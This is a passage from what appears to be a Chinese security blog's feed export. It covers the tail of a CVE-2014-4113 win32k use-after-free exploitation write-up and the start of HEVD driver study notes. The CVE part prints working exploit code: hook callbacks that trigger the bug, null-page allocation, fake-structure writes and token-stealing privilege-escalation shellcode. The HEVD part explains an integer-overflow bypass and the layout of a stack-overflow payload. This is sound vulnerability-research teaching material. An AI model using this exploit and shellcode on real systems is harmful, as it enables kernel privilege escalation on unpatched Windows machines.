pwnd-&gt;head.pti（判断发送的窗口是否属于当前线程）(已满足)</li><li>gptiCurrent-&gt;fsHooks（使用SetWindowsHookEx即可满足）</li><li>ptagWND-&gt;bServerSideWindowProc（满足）</li><li>在0x1EB消息发送后修改快捷菜单的窗口过程(ptagwnd-&gt;lpfnWndProc)（使用SetWindowLongPtr可以满足）</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;继续构造新的poc。使用SetWindowsHookEx添加一个钩子过程。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//Step1:注册窗口类和创建窗口</span></div><div class="line">ATOM reg = RegisterClassA(&amp;wnd_class);</div><div class="line">HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, <span class="string">""</span>, WS_OVERLAPPEDWINDOW | WS_VISIBLE, <span class="number">0</span>, <span class="number">0</span>, <span class="number">640</span>, <span class="number">480</span>, NULL, NULL, wnd_class.hInstance, NULL);</div><div class="line"><span class="comment">//Step2:创建第一个菜单</span></div><div class="line">HMENU MenuOne = CreatePopupMenu();</div><div class="line">BOOL insertMenuItem = InsertMenuItemA(MenuOne, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuOneInfo);</div><div class="line">TrackPopupMenu(MenuOne,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div><div class="line"><span class="comment">//Step3：创建第二个菜单</span></div><div class="line">HMENU MenuTwo = CreatePopupMenu();</div><div class="line">insertMenuItem = InsertMenuItemA(MenuTwo, <span class="number">0</span>, <span class="literal">TRUE</span>, &amp;MenuTwoInfo);</div><div class="line"><span class="comment">//Step5：触发漏洞</span></div><div class="line">TrackPopupMenu(MenuTwo,<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, main_wnd, NULL);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;编写钩子处理函数，根据上面分析，<code>xxxMNFindWindowFromPoint</code>调用 <code>xxxSendMessage</code>发送<code>MN_FINDMENUWINDOWFROMPOINT</code>(0x1EB)消息，用来查找菜单窗口对象。所以我们需要钩取<code>MN_FINDMENUWINDOWFROMPOINT</code>消息。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK HookCallback(<span class="keyword">int</span> code, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>) &#123;</div><div class="line">printf(<span class="string">"Callback one called.\n"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">if</span> (*(DWORD*)(<span class="keyword">lParam</span> + <span class="number">8</span>) == MN_FINDMENUWINDOWFROMPOINT) </div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) </div><div class="line">&#123;</div><div class="line">SetWindowLongA(*(<span class="keyword">HWND</span>*)(<span class="keyword">lParam</span> + <span class="number">12</span>), GWLP_WNDPROC, (LONG)HookCallbackTwo)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, <span class="keyword">wParam</span>, <span class="keyword">lParam</span>)<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;钩子函数原型如下，<code>nCode</code>可以指定挂钩函数是否必须处理消息，<code>wParam</code>表示消息是否可以由当前线程发送，<code>lparam</code>指向的是tagCWPSTRUCT结构体指针。tagCWPSTRUCT结构体第3个成员表示消息类型。可以根据<code>*(DWORD*)(lParam + 8)</code>的值判断消息是否是<code>MN_FINDMENUWINDOWFROMPOINT</code>。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">LRESULT CALLBACK CallWndProc(</div><div class="line">  _In_ <span class="keyword">int</span>    nCode,</div><div class="line">  _In_ <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>,</div><div class="line">  _In_ <span class="keyword">LPARAM</span> <span class="keyword">lParam</span></div><div class="line">)<span class="comment">;</span></div><div class="line">typedef struct tagCWPSTRUCT &#123;</div><div class="line">  <span class="keyword">LPARAM</span> <span class="keyword">lParam</span><span class="comment">;</span></div><div class="line">  <span class="keyword">WPARAM</span> <span class="keyword">wParam</span><span class="comment">;</span></div><div class="line">  UINT   message<span class="comment">;</span></div><div class="line">  <span class="keyword">HWND</span>   <span class="keyword">hwnd</span><span class="comment">;</span></div><div class="line">&#125; CWPSTRUCT, *PCWPSTRUCT, *NPCWPSTRUCT, *LPCWPSTRUCT<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在窗口钩子的处理函数中，如果处理的消息为<code>MN_FINDMENUWINDOWFROMPOINT</code>,就会调用<code>SetWindowLongA</code>修改菜单的消息处理函数，为什么要这样呢？我理解的是，当使用SetWindowsHook设置的是针对窗口的钩子函数，所以还需要通过<code>SetWindowLongA</code>为菜单对象设置钩子函数。<code>hWnd</code>是指窗口句柄。<code>nIndex</code>是指偏移，选择<code>GWL_WNDPROC</code>为窗口函数设置一个新地址。<code>dwNewLong</code>在这里指的是函数地址。<code>HookCallbackTwo</code>是针对菜单对象的处理函数，在这个函数中需要释放菜单，并且返回-5。<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">LONG SetWindowLongA(</div><div class="line">  [in] <span class="keyword">HWND</span> <span class="keyword">hWnd</span>,</div><div class="line">  [in] <span class="keyword">int</span>  nIndex,</div><div class="line">  [in] LONG dwNewLong</div><div class="line">)<span class="comment">;</span></div><div class="line"><span class="comment">//针对菜单对象的处理函数</span></div><div class="line">LRESULT CALLBACK HookCallbackTwo(<span class="keyword">HWND</span> <span class="keyword">hWnd</span>, UINT Msg, <span class="keyword">WPARAM</span> <span class="keyword">wParam</span>, <span class="keyword">LPARAM</span> <span class="keyword">lParam</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"Callback two called.\n"</span>)<span class="comment">;</span></div><div class="line">EndMenu()<span class="comment">;</span></div><div class="line"><span class="keyword">return</span> <span class="number">-5</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然,当菜单钩子函数返回值为-5的时候，<code>win32k!xxxMNFindWindowFromPoint</code>的返回值为<code>0xfffffffb</code>,由此造成UAF。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">95ab7b52 89460c         <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">eax</span></div><div class="line">95ab7b55 <span class="number">53</span>             <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line">95ab7b56 8d4510         <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+<span class="number">10h</span>]</div><div class="line">95ab7b59 <span class="number">50</span>             <span class="keyword">push</span>    <span class="built_in">eax</span></div><div class="line">95ab7b5a <span class="number">57</span>             <span class="keyword">push</span>    <span class="built_in">edi</span></div><div class="line">95ab7b5b e88596ffff     <span class="keyword">call</span>    win32k!xxxMNFindWindowFromPoint (95ab11e5)</div><div class="line">95ab7b60 8bd8           <span class="keyword">mov</span>     <span class="built_in">ebx</span>, <span class="built_in">eax</span></div><div class="line">kd&gt; g</div><div class="line">Breakpoint <span class="number">1</span> hit</div><div class="line">win32k!xxxHandleMenuMessages+<span class="number">0x9e</span>:</div><div class="line">95ab7b60 8bd8            <span class="keyword">mov</span>     <span class="built_in">ebx</span>,<span class="built_in">eax</span></div><div class="line">kd&gt; r <span class="built_in">eax</span></div><div class="line"><span class="built_in">eax</span>=fffffffb</div></pre></td></tr></table></figure></p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上一节介绍了，CVE-2014-4113最终是在<code>win32k!xxxSendMessageTimeout+0xb3</code>crash。我们再来分析一下，首先<code>int __stdcall xxxSendMessageTimeout(tagWND *pwnd, UINT message, WPARAM wParam, LPARAM lParam, UINT fuFlags, UINT uTimeout, PLONG_PTR lpdwResult)</code>的<code>*pwnd</code>是可控的，在CVE-2014-4113这个漏洞中，该值为0xFFFFFFFB.当执行流执行到0x95A44856的时候，此时esi为0xFFFFFFFB，则<code>[esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</code>即会调用地址为0x5B这个地址的函数。<br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nt!RtlpBreakWithStatusInstruction:</div><div class="line"><span class="number">83e6</span>d394 cc              int     <span class="number">3</span></div><div class="line">kd&gt; G</div><div class="line">Access violation - code c0000005 (!!! second chance !!!)</div><div class="line">win32k!xxxSendMessageTimeout+<span class="number">0</span>xb3:</div><div class="line"><span class="number">94</span>a54760 <span class="number">3</span>b7e08          cmp     edi,dword ptr [esi+<span class="number">8</span>]</div></pre></td></tr></table></figure></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A446C1 loc_95A446C1:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+F↑j</span></div><div class="line"><span class="symbol">.text:</span>95A446C1                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+pwnd] <span class="comment">; CVE-2014-4113 esi = 0xFFFFFFFB</span></div><div class="line"><span class="symbol">.text:</span>95A446C4                 <span class="keyword">cmp</span>     <span class="built_in">esi</span>, <span class="number">0FFFFFFFFh</span></div><div class="line"><span class="symbol">.text:</span>95A446C7                 <span class="keyword">jnz</span>     short loc_95A44700</div><div class="line">[...]</div><div class="line"><span class="symbol">.text:</span>95A4484E loc_95A4484E:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+198↑j</span></div><div class="line"><span class="symbol">.text:</span>95A4484E                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+lParam]</div><div class="line"><span class="symbol">.text:</span>95A44851                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+wParam]</div><div class="line"><span class="symbol">.text:</span>95A44854                 <span class="keyword">push</span>    <span class="built_in">ebx</span></div><div class="line"><span class="symbol">.text:</span>95A44855                 <span class="keyword">push</span>    <span class="built_in">esi</span></div><div class="line"><span class="symbol">.text:</span>95A44856                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">60h</span>] <span class="comment">; [esi+60] = [0xFFFFFFFB + 0x60] = 0x5B</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述分析，要想执行流执行到0x95A44856，需要满足两个条件，内存地址为3的地址存放的是当前线程信息。gptiCurrent是一个全局变量，其指向的是tagTHREADINFO结构，也就是线程环境块偏移0x40的Win32ThreadInfo结构。<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">.<span class="string">text:</span><span class="number">95</span>A4475A                 mov     edi, _gptiCurrent</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44760                 cmp     edi, [esi+<span class="number">8</span>]    ; [esi+<span class="number">8</span>] = [<span class="number">0xFFFFFFFB</span> +<span class="number">8</span> ] = <span class="number">0x3</span></div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44763                 jz      loc_95A447ED</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A44769                 mov     ecx, [esi]</div><div class="line">.<span class="string">text:</span><span class="number">95</span>A4476B                 mov     edx, dword_95B9C0E4</div><div class="line">kd&gt; dt _teb</div><div class="line">nt!_TEB</div><div class="line">+<span class="number">0x000</span> <span class="string">NtTib :</span> _NT_TIB</div><div class="line">+<span class="number">0x01c</span> <span class="string">EnvironmentPointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x020</span> <span class="string">ClientId :</span> _CLIENT_ID ：当前进程ID</div><div class="line">+<span class="number">0x028</span> <span class="string">ActiveRpcHandle :</span> Ptr32 Void</div><div class="line">+<span class="number">0x02c</span> <span class="string">ThreadLocalStoragePointer :</span> Ptr32 Void</div><div class="line">+<span class="number">0x030</span> <span class="string">ProcessEnvironmentBlock :</span> Ptr32 _PEB 当前进程的PEB指针</div><div class="line">+<span class="number">0x034</span> <span class="string">LastErrorValue :</span> Uint4B</div><div class="line">+<span class="number">0x038</span> <span class="string">CountOfOwnedCriticalSections :</span> Uint4B</div><div class="line">+<span class="number">0x03c</span> <span class="string">CsrClientThread :</span> Ptr32 Void</div><div class="line">+<span class="number">0x040</span> <span class="string">Win32ThreadInfo :</span> Ptr32 Void</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二，地址为4的内存的值为4<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>95A44826 loc_95A44826:                           <span class="comment">; CODE XREF: xxxSendMessageTimeout(x,x,x,x,x,x,x,x)+151↑j</span></div><div class="line"><span class="symbol">.text:</span>95A44826                 <span class="keyword">test</span>    <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">16h</span>], <span class="number">4</span> <span class="comment">; [esi+8] = [0xFFFFFFFB +16] = 0x11</span></div><div class="line"><span class="symbol">.text:</span>95A4482A                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+HighLimit]</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上述描述，最终通过<code>call    dword ptr [esi+60h]</code>执行shellcode，所以我们需要在<code>0x5B</code>处提前设置Shllcode的地址。在《Windows核心编程》关于内存结构的章节中指出：Windows系统存在空指针赋值分区，其范围从0x00000000至0x0000FFFF，由于这部分内存位于地址空间的最开始，因此也称之为零页内存。可以通过<code>NtAllocateVirtualMemory</code>分配内存空间，对于Windows系统，在进程的虚拟空间申请一块内存时，该块内存默认为64KB大小对齐（分配内存的起始地址必须为64KB的整数倍），因此，当我们设置分配内存的起始地址为0x00000100时，系统会强制决定起始地址为0x00000000，由于我们分配页面大小选择4KB，因此分配得到的内存空间为0x00000000~0x00001FFF。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">BOOL AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>);</div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p <span class="subst">\n</span>"</span>, NtAllocateVirtualMemory);</div><div class="line"><span class="comment">//https://www.anquanke.com/post/id/241057</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span>;</div><div class="line">PVOID BaseAddress = (PVOID)<span class="number">0x100</span>;   <span class="comment">//虽然将baseaddr设置为0x100，系统会强制将起始地址设置为0x00000000</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span>;</div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;BaseAddress,</div><div class="line"><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE);</div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error<span class="subst">\n</span>"</span>);</div><div class="line">return <span class="literal">FALSE</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">//getchar();</span></div><div class="line">return <span class="literal">TRUE</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了能执行到漏洞利用处，需要满足上面两个条件,并设置shellcode地址。<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x03) = (<span class="name">DWORD</span>)GetPtiCurrent()<span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x11) = (<span class="name">DWORD</span>)<span class="number">4</span><span class="comment">;</span></div><div class="line">*(<span class="name">DWORD*</span>)(<span class="number">0</span>x5B) = (<span class="name">DWORD</span>)&amp;ShellCode<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造Shellcode函数值得注意的是，首先Shellcode函数的函数原型必须和<code>result = pwnd-&gt;lpfnWndProc(pwnd, message_1, wParam, lParam);</code>保持一致。而且尽量让编译器进行堆栈的平衡。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span>  __stdcall ShellCode(<span class="keyword">int</span> parameter1, <span class="keyword">int</span> parameter2, <span class="keyword">int</span> parameter3, <span class="keyword">int</span> parameter4)</div><div class="line">&#123;</div><div class="line">_asm</div><div class="line">&#123;</div><div class="line"><span class="keyword">pushad</span></div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="built_in">fs</span>:[<span class="built_in">eax</span> + KTHREAD_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + EPROCESS_OFFSET]</div><div class="line"><span class="keyword">mov</span> <span class="built_in">ecx</span>, <span class="built_in">eax</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, SYSTEM_PID<span class="comment">;</span></div><div class="line"><span class="symbol">SearchSystemPID:</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span> + FLINK_OFFSET]</div><div class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, FLINK_OFFSET</div><div class="line"><span class="keyword">cmp</span>[<span class="built_in">eax</span> + PID_OFFSET], <span class="built_in">edx</span><span class="comment">;</span></div><div class="line"><span class="keyword">jne</span> SearchSystemPID</div><div class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">eax</span> + TOKEN_OFFSET]</div><div class="line"><span class="keyword">mov</span>[<span class="built_in">ecx</span> + TOKEN_OFFSET], <span class="built_in">edx</span></div><div class="line"><span class="keyword">popad</span></div><div class="line">&#125;</div><div class="line">return <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h2><ul><li>[1] <a href="https://b2ahex.github.io/blog/2017/06/13/4113分析/index.html" target="_blank" rel="external">CVE-2014-4113 漏洞利用分析</a> : 主要的poc构建框架</li><li>[2] <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp</a> : CVE-2014-4113的exp</li><li>[3] <a href="https://bbs.pediy.com/thread-271809.htm" target="_blank" rel="external">CVE-2014-4113提权漏洞学习笔记</a> : 详细的分析笔记</li><li>[4] <a href="https://www.anquanke.com/post/id/84869" target="_blank" rel="external">[技术分享]经典内核漏洞调试笔记</a></li><li>以及小刀师傅的详细解答</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CVE-2014-4113是Win32k下的释放后重引用漏洞(UAF)，该漏洞位于&lt;code&gt;win32k!xxxHandleMenuMessages&lt;/code&gt;中，通过调用&lt;code&gt;win32k!xxxMNFindWindowFromPoint&lt;/code&gt;获取tagWnd指针，在此期间，执行流通过回调机制，返回用户侧，在用户侧释放目标菜单对象，并返回&lt;code&gt;0xFFFFFFFB&lt;/code&gt;。当执行流重新返回内核侧，&lt;br&gt;并没有针对返回值进行校验，直接使用该返回值作为参数传入&lt;code&gt;win32k!xxxSendMessage&lt;/code&gt;发送&lt;code&gt;MN_BUTTONDOWN&lt;/code&gt;消息，由此造成UAF。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>HEVD学习</title>
    <link href="https://findream.github.io/2022/07/05/HEVD%E5%AD%A6%E4%B9%A0/"/>
    <id>https://findream.github.io/2022/07/05/HEVD学习/</id>
    <published>2022-07-05T07:02:11.000Z</published>
    <updated>2022-11-12T07:08:32.818Z</updated>
    
    <content type="html"><![CDATA[<ul><li>HEVD简单学习<a id="more"></a></li></ul><h1 id="0x1-整数溢出"><a href="#0x1-整数溢出" class="headerlink" title="0x1 整数溢出"></a>0x1 整数溢出</h1><h2 id="0x1-1-成因分析"><a href="#0x1-1-成因分析" class="headerlink" title="0x1.1 成因分析"></a>0x1.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;整数包括无符号整数和有符号整数，但是对于计算机来说，区分无符号整数和有符号整数意义不大，比如”-1”,无符号整数来说，其值为<code>4294967295</code>,也就是<code>0xFFFFFFFF</code>,编译器根据数据类型的不同，生成不同的代码，规定了每个数据变量的长度。在自然语义环境中，如果是4294967295加上4，最终会得到4294967299这个数字，但是，在计算机语义中，这个是在这个数据类型中是最大的，加上4就需要向高位拓展。这样就会丢弃拓展的高位。整数溢出就是这样产生的。例如,<code>0xFFFFFFFF</code>加上<code>4</code>之后，得到的数据就是<code>3</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>整数溢出漏洞的作用是什么，整数溢出主要是为了绕过可能的长度检查。</strong>如下的例子，如果输入任意正整数，都不可能使得b+c 小于 a，但是如果输入的c是0xFFFFFFF0，因为整数溢出，0xFFFFFFFA+0x9 = 0x3.如此就绕过了长度检查。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> a = <span class="number">8</span>;</div><div class="line"><span class="keyword">int</span> b = <span class="number">9</span>;</div><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;c);</div><div class="line"><span class="keyword">if</span>(b+c &lt; <span class="number">8</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"success"</span>)</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"failed"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD的IntegerOverflow位于TriggerIntegerOverflow函数中，直接通过反汇编看，已知函数栈空间为0x820+0x04=0x824,也就是说要实现栈溢出需要0x824+0x04的大小实现。但是在代码中，对缓冲区长度进行了校验，根据自然语义下理解，缓冲区长度加上4要小于0x800，说明缓冲区不可能超过0x800，这样就不会造成栈溢出。<br>    <img src="http://hacky.wang/blog/20220722/hx8xVjwNx9xf.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是由于整数溢出，当我传入的UserBufferLength为0xFFFFFFFF，加个4，得0x3，这样自然就绕过了大小的限制。</p><h2 id="0x1-2-漏洞利用"><a href="#0x1-2-漏洞利用" class="headerlink" title="0x1.2 漏洞利用"></a>0x1.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据分析代码，明确使用栈溢出进行利用，使用整数溢出绕过长度检查。查看代码，要使进行缓冲区复制需要两个条件，Buffer内容不为0xBAD0B0B0，长度小于UserBufferLength/4。在使用整数溢出的是和，第二个条件得到满足，但是前面也说了实现栈溢出需要0x824+0x04的大小的缓冲区，所以，构造的payload主要构成是这样的，0x824长度用于填充缓冲，0x04是提权shellcode的地址，最后四个字节内容为0xBAD0B0B0，用于终止缓冲区复制。<br>    <img src="http://hacky.wang/blog/20220722/V9QyljolQXJA.png?imageslim" alt="mark"></p><h1 id="0x2-栈溢出"><a href="#0x2-栈溢出" class="headerlink" title="0x2 栈溢出"></a>0x2 栈溢出</h1><h2 id="0x2-1-环境安装与HEVD说明"><a href="#0x2-1-环境安装与HEVD说明" class="headerlink" title="0x2.1 环境安装与HEVD说明"></a>0x2.1 环境安装与HEVD说明</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;安装完VirtualKd和Windbg Preview之后，配置WindbgPreview，首先在启动虚拟机之前，配置Costumer如下：<code>DbgX.Shell.exe /k com:pipe,resets=0,reconnect,port=$(pipename)</code>。然后启动虚拟机可能也运行不起WindbgPreview，如果出现这种情况，先设置<code>WinDbg.exe</code>的路径，然后运行调试器，等Windbg起来后，在勾选到<code>Costumer</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HEVD有编译好的SYS文件以及源码，其中编译好的SYS有两个文件夹，<code>secure</code>是已经修复过的SYS，而<code>vulnerable</code>是指存在漏洞的SYS。源码是修复之后的代码。<br>    <img 